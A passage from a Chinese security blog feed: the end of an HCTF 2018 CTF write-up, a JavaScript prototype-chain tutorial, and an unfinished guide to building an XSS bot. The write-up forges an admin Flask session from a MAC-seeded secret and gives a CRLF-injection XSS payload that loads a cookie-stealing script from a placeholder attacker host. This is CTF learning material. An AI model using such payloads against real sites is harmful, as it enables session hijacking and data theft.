class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, render_template, redirect, url_for, escape, request, Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username = request.form[<span class="string">'username'</span>]</span><br><span class="line">    password = request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span> + extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="keyword">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="keyword">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure><br>读取/app/hard_t0_guess_n9f5a95b5ku9fg/flag.py发现不是admin无法读取。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/hideandseek03.png" alt=""><br>转换思路，读取/app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html看看，发现主页变为<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/hideandseek04.png" alt=""><br>在代码第40行得知admin无法登陆，所以又是伪造session来获得admin的登录态。从main.py可以知道secret是随机数，而随机数的种子是uuid.getnode()，也就是mac地址，可以从/sys/class/net/eth0/address来获取，得到12:34:3e:14:7c:62，在python3的环境下伪造session，将session放回网站拿到flag。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">20015589129314</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    session.permanent = <span class="keyword">True</span>  </span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'admin'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/get/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> session.get(<span class="string">'username'</span>)</span><br></pre></td></tr></table></figure><br>访问/get/查看session放回原网站拿到flag<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/hideandseek05.png" alt=""></p><h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>一道很新颖的题目。可以随意注册，注册完之后在user.php可以进行排序，order可以等于id,username,sex,score,没有发现注入点。经过提示，尝试order=password发现可以排序，我们可以因此通过不断比较密码得到admin的密码。并且注册两个号后比较发现是降序排列。<br>例如注册一个密码为d的用户，在密码排序下发现在admin下面，注册一个密码为e的用户，在admin的上面，可以推断出admin的第一位密码是d，按照这样使用脚本爆破出admin的密码，登录访问flag.php即可得到flag。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/game01.png" alt=""></p><h1 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h1><p>这是一个16年的cve漏洞。参考<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html。" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html。</a><br>提交url的时候会进行302跳转。尝试头注入。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/bottle01.png" alt=""><br>CSP头在响应的下方，直接导致CSP无效。但在302的时候无法xss，需要找到一个端口来绕过302跳转，当0或者22号端口的时候可以打到cookie，拿到cookie后到网站上使用cookie拿到flag。<br>最终payload：<code>http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/%0d%0aContent-Length:%2065%0d%0a%0d%0a%3Cscript%20src=http://youvps/cookie.js%3E%3C/script%3E</code><br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/bottle02.png" alt=""></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实还有两道web题我没有写出wp，一道ruby一道web加密码学，即使看了学长的wp依旧没能深刻理解，学习无止境吧，明年继续加油。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>Unicode 安全:<a href="http://blog.lnyas.xyz/?p=1411" title="Unicode 安全" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=1411</a><br>CVE-2016-9964:<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" title="CVE-2016-9964" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;上周末忙着准备期中考试，HCTF也只是匆匆看了几题，有个思路之后就没再做了，这两天趁着服务器还没关闭来重新复现一下，相比去年的HCTF，今年
      
    
    </summary>
    
    
      <category term="web" scheme="http://zcluslloye.cn/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>浅谈JavaScript中的原型链</title>
    <link href="http://zcluslloye.cn/2018/11/02/js-prototype/"/>
    <id>http://zcluslloye.cn/2018/11/02/js-prototype/</id>
    <published>2018-11-02T11:32:47.000Z</published>
    <updated>2018-11-14T09:36:55.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Javascript是我最喜欢的几种语言之一，从暑假后半段一直到开学一直在看《Javascript高级程序设计》，我觉得这本书很好，讲得很全面，但对于js中的原型链自己还是有必要花点时间好好理一理，于是就写下此篇文章。</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>先来讲讲js中创建对象的几种方法。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一种：字面量</span></span><br><span class="line"><span class="keyword">var</span> o1 = &#123;<span class="attr">name</span>:<span class="string">'o1'</span>&#125;</span><br><span class="line"><span class="keyword">var</span> o2 = <span class="keyword">new</span> <span class="built_in">Object</span>(&#123;<span class="attr">name</span>:<span class="string">'o2'</span>&#125;)</span><br><span class="line"><span class="comment">//第二种：使用构造函数</span></span><br><span class="line"><span class="keyword">var</span> F = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;<span class="keyword">this</span>.name = name;&#125;</span><br><span class="line"><span class="keyword">var</span> o3 = <span class="keyword">new</span> F(<span class="string">'o3'</span>);</span><br><span class="line"><span class="comment">//第三种：使用Object.create</span></span><br><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">name</span>:<span class="string">'o4'</span>&#125;</span><br><span class="line"><span class="keyword">var</span> o4 = <span class="built_in">Object</span>.create(o)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o1);</span><br><span class="line"><span class="built_in">console</span>.log(o2);</span><br><span class="line"><span class="built_in">console</span>.log(o3);</span><br><span class="line"><span class="built_in">console</span>.log(o4);</span><br></pre></td></tr></table></figure><br>让我们看看结果：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/01.png" alt=""><br>3种创建方法返回的结果是不一样的。这就和这篇文章要讲的有关系。</p><h1 id="原型-amp-amp-原型链"><a href="#原型-amp-amp-原型链" class="headerlink" title="原型&amp;&amp;原型链"></a>原型&amp;&amp;原型链</h1><p>先上两张《js高级程序设计》中关于原型链的图片<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/02.png" alt=""><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/03.png" alt=""><br>这两张图对于萌新甚至是某些老手都没理解清楚。<br>我自己做了一张流程图，下面我们就来细说图中的名词。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/04.png" alt=""><br><b>让我们从实例出发：</b><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> F = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;<span class="keyword">this</span>.name = name;&#125;</span><br><span class="line"><span class="keyword">var</span> o3 = <span class="keyword">new</span> F(<span class="string">'o3'</span>);</span><br></pre></td></tr></table></figure></p><p><ul><li>所谓的实例就是生成出来的对象，例如上面的例子中o3就是实例</li><li>F就是构造函数，用来提供创建对象的方法</li><li>实例中的&#95;_proto__指向原型对象</li><li>实例的构造函数的prototype也是指向的原型对象</li><li>原型对象的construor指向的是构造函数</li></ul><br>我们用console来看看<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/05.png" alt="">基本上就和流程图上的差不多。</p><p><b>那什么是原型链呢？</b><br>简单地说，就是由原型所组成的链，一个对象的&#95;_proto__就是它的原型，而这个原型也是一个对象，所以他也有&#95;_proto__属性，指向它的上一个原型，一直通过&#95;_proto__向上查找，直到Object的时候，这条原型链就到头了。</p><p><b>说了这么多，原型链到底有啥用？</b><br>当我们通过构造函数创建了许多实例，如果某些对象要增加方法，一个个去实例中添加就很繁琐，这时我们可以将方法添加到原型中，使这个原型的所有实例都有这个方法。举个代码例子：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> F = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;<span class="keyword">this</span>.name = name;&#125;</span><br><span class="line"><span class="keyword">var</span> o3 = <span class="keyword">new</span> F(<span class="string">'o3'</span>);</span><br><span class="line"><span class="keyword">var</span> o5 = <span class="keyword">new</span> F(<span class="string">'o5'</span>);</span><br><span class="line">o3.__proto__.say=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">'hello JavaScript'</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">o3.say()</span><br><span class="line">o5.say()</span><br></pre></td></tr></table></figure><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/06.png" alt="">我们可以发现打印出了相同字符串。</p><p><b>原型链的另一个作用就是继承，再举个简单的小例子：</b><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Father = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;<span class="keyword">this</span>.name = name;&#125;;</span><br><span class="line">Father.prototype.say=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="string">"hello world!"</span>)&#125;;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> Father(<span class="string">"javascript"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">Son.prototype = a;</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> Son()</span><br><span class="line">b.say();</span><br></pre></td></tr></table></figure><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/07.png" alt=""><br>这里可以很清楚，b中并没有say这个方法，而是从father那边继承过来的，我们可以看看Son.prototype<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/08.png" alt="">可以看到原型链一直到Object。</p><p><b>回到最初创建对象的方法。</b><br>第一种就直接使用Object类来创建实例，所以&#95;_proto__直接指向了Object;第二种方法使用了构造函数，可以看到o3的&#95;_proto__指向了<strong>函数构造出来的对象(原型对象)</strong>，而这个对象的&#95;_proto__s指向的是Object；<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/09.png" alt="">最后第三种方法使用了Object.create。<b>MDN的文档中给出：Object.create()方法创建一个新对象，使用现有的对象来提供新创建的对象的&#95;_proto__。 </b><br>所以o4.&#95;_proto__指向的是它的父对象(允许我这么叫它)，而o4.&#95;_proto__.&#95;_proto__指向的才是Object。<br>这也就是为什么三种方式在console里面返回的结果不同。至于使用构造函数创建的o3在console里为什么会这么显示，让人觉得o3.&#95;_proto__指向Object就不得而知了。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/10.png" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于js，原型链一直是它的难点和重点，这次通过简单的复习和梳理再次学习了一下。<br>写下这篇文章也算是对JavaScript的一种喜爱和敬畏吧，对于原型链也只是了解了皮毛，希望今后对js的学习可以更加深入。<br>如有错误或者讲的不当的地方请与我联系。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《JavaScript高级程序设计》<br><a href="https://www.cnblogs.com/chengzp/p/prototype.html" target="_blank" rel="noopener">https://www.cnblogs.com/chengzp/p/prototype.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Javascript是我最喜欢的几种语言之一，从暑假后半段一直到开学一直在看《Javascript高级程序设计》，我觉得这本书很好，讲得很全
      
    
    </summary>
    
    
      <category term="web" scheme="http://zcluslloye.cn/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>从零开始完成xssbot</title>
    <link href="http://zcluslloye.cn/2018/10/10/xssbot1/"/>
    <id>http://zcluslloye.cn/2018/10/10/xssbot1/</id>
    <published>2018-10-10T14:20:28.000Z</published>
    <updated>2018-10-14T09:46:12.744Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前一阵子开始研究了一下xssbot，在网上找了许多文章，但这些文章重点都放在bot代码部分，对其完整网站的实现并不是说的挺清楚，这篇文章总结了我从入门到编写一个完整xss demo的心得。</p><h1 id="bot原型"><a href="#bot原型" class="headerlink" title="bot原型"></a>bot原型</h1><h2 id="bot做些什么？"><a href="#bot做些什么？" class="headerlink" title="bot做些什么？"></a>bot做些什么？</h2><p>在我看来，bot就是代替管理员去点击页面，然后获取内容，执行js。所以对于bot来说，就是能够执行js。</p><h2 id="bot准备"><a href="#bot准备" class="headerlink" title="bot准备"></a>bot准备</h2><p>一般来说现在的xssbot基本上是通过python或者java实现。这里我们采用python+selenium+webdriver。<br>而webdriver又有chrome webdriver，Firefox webdriver，phantomjs。</p><h3 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h3><p>selenium是用来控制webdriver的，在python中直接使用pip安装之后便可导入。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> selenium</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</span><br></pre></td></tr></table></figure></p><h3 id="chrome-webdriver"><a href="#chrome-webdriver" class="headerlink" title="chrome webdriver"></a>chrome webdriver</h3><p>如果bot运行在windows上，我建议使用chrome webdriver。如果要使用chrome webdriver，不仅要安装chrome，还必须在谷歌官网下载webdriver。<br><a herf="https://sites.google.com/a/chromium.org/chromedriver/downloads">https://sites.google.com/a/chromium.org/chromedriver/downloads</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> selenium</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</span><br><span class="line">chromedriver = <span class="string">"C:\chromedriver.exe"</span> </span><br><span class="line">browser = webdriver.Chrome(chromedriver) </span><br><span class="line">url = <span class="string">"http://www.baidu.com"</span></span><br><span class="line">browser.get(url)</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure></p><h3 id="firefox-webdriver"><a href="#firefox-webdriver" class="headerlink" title="firefox webdriver"></a>firefox webdriver</h3><p>firefox与chrome类似，需要一个geckodriver。<br><a href="https://github.com/mozilla/geckodriver/releases/" target="_blank" rel="noopener">https://github.com/mozilla/geckodriver/releases/</a><br>在ubuntu下使用firefox较为简单，因为firebox可直接使用apt安装，然后把geckodriver添加到/bin/并赋予执行权限就可以了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> selenium</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">"http://www.baidu.com"</span></span><br><span class="line">browser.get(url)</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure></p><h3 id="phantomjs"><a href="#phantomjs" class="headerlink" title="phantomjs"></a>phantomjs</h3><p>phantomjs的优势是并不需要浏览器的支持，而且支持多平台。由于网上爬虫案例很多这里便不再多讲。</p><h2 id="bot实现"><a href="#bot实现" class="headerlink" title="bot实现"></a>bot实现</h2><p>chrome和firebox的webdriver都需要桌面，而由于我们部署ctf题目通常是在linux服务器上，所以通常需要一个虚拟的桌面。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display</span><br><span class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>,<span class="number">800</span>))</span><br><span class="line">display.start()</span><br></pre></td></tr></table></figure><br>再加上上面的两种webdriver代码，如此我们便可以运行一个具有浏览器特性的bot。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display</span><br><span class="line"><span class="keyword">import</span> selenium</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</span><br><span class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>,<span class="number">800</span>))</span><br><span class="line">display.start()</span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">"http://www.baidu.com"</span></span><br><span class="line">browser.get(url)</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure></p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>上面我们讲了如何实现bot本身，现在来讲讲如何完成一个完整的留言型xss demo。一种基本的思路如下：<br>1.用户提交留言到数据库，并设置验证码保证恶意刷payload导致bot卡死。<br>2.数据库添加一栏是否被bot访问的标志位。<br>3.后端提供访问接口，避免bot远程访问数据库，引起不必要的麻烦。<br>4.后端以cookie或者ip来判断是否是bot访问。<br>5.bot访问一条数据后，将标志位update，说明该条留言已经被bot访问过。<br>按照此思路我们可以写出后端管理员页面的代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//admin666.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//取出一条isread为0的未读消息，将content放在网页上，并update isread</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"db.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'key'</span>]) &amp;&amp; $_COOKIE[<span class="string">'key'</span>] !== <span class="string">"admin123!@#"</span>)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"you are not admin!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">$query1 = <span class="string">"select * from content where isread = '0' limit 1"</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query1);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no message unread."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $row = $result-&gt;fetch_array();</span><br><span class="line">    $contentid = $row[<span class="string">'contentid'</span>];</span><br><span class="line">    $content = $row[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">echo</span>($content);</span><br><span class="line">    $query2 = <span class="string">"update content set isread = 1 where contentid 